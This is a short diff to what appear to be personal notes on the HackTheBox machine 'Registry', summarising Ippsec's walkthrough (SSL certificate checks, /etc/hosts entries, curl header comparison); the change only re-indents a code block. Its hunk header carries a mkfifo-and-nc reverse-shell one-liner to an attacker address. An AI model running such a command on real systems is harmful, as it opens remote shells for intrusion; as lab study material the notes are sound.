@@ -230,9 +230,9 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 1234 >/tmp/f
 ### Ippsec's Walkthrough  
 * If I did the aggressive nmap scan on the https port I get the ssl certificate which gives me the information I need for the subdomain of the virtual host. There also could be the date when the certificate was created.  
 * For the domain of the IP he put `docker.registry.htb` and `registry.htb` in the `/etc/hosts` file in case both are needed  
-```console
-10.10.10.159  docker.registry.htb registry.htb
-```  
+  ```console
+  10.10.10.159  docker.registry.htb registry.htb
+  ```  
 * It's always good to look at the SSL certificate info.  
 * He `curl -vvv http://url` and compared it with the `curl -vvv -k https://url` he compared the outputs to see if there's a difference in the headers.
 * He uses "FoxyProxy".
